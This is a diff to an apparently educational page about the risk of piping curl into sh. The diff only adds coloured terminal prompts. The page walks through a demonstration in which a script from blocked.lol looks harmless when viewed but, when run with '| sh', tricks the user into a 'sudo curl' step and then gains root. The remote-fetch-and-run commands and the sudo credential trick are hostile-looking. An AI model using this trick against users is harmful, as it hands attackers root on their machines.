@@ -35,6 +35,7 @@ Have you ever been bitten by someone modifying these scripts?
 
 You'd probably do this then:
 
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
 $ curl -sL blocked.lol/greetz.sh
 # blocked.lol greetingz shell script 2020
 # We declare USERNAME variable with the result of whoami
@@ -45,11 +46,13 @@ echo "Hello $USERNAME"
 
 Fine, this script is safe after all... but wait, what?
 
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
 $ curl -sL blocked.lol/greetz.sh | sh
 curl is desynchronized!
 Run sudo curl -sS ntppool.org to fix
 
 Weird, never seen this one, but let's go
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
 $ sudo curl -sS ntppool.org
 Password:
 <html>
@@ -61,6 +64,7 @@ Password:
 </html>
 
 Hm, ok let's try again...
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
 $ curl -sL blocked.lol/greetz.sh | sh
 Hello root
 I am root! Try cat -t on greetz.sh
@@ -88,4 +92,4 @@ I am root! Try cat -t on greetz.sh
 
 Do you want to know what happened? Run this
 
-$ curl -sL blocked.lol/greetz.sh | cat -t
+curl -sL blocked.lol/greetz.sh | cat -t
